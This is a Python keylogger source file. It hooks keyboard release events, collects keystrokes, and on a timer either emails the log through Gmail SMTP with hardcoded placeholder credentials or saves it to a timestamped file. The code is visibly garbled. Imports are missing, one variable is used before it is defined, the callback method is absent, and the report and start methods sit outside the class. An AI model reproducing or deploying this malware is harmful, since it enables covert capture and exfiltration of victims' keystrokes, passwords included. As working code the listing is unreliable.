import datetime
SEND_REPORT_EVERY = 60
EMAIL_ADDRESS = "notmygmail@gmail.com"
EMAIL_PASSWORD = "notmypassword"


def sendmail(email, password, message):
    server = smtplib.SMTP(host="smtp.gmail.com", port=587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.filename = None
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        if name == "space":
            name = " "
        elif name == "enter":
            name = "[ENTER]\n"
        elif name == "decimal":
            name = "."
        else:
            name = name.replace(" ", "_")
            name = f"[{name.upper()}]"

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")


def report(self):
    if self.log:
        self.end_dt = datetime.now()
        self.update_filename()
        if self.report_method == "email":
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
        elif self.report_method == "file":
            self.report_to_file()
        self.start_dt = datetime.now()
    self.log = ""
    timer = Timer(interval=self.interval, function=self.report)
    timer.daemon = True
    timer.start()


def start(self):
    self.start_dt = datetime.now()
    keyboard.on_release(callback=self.callback)
    self.report()
    keyboard.wait()


if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
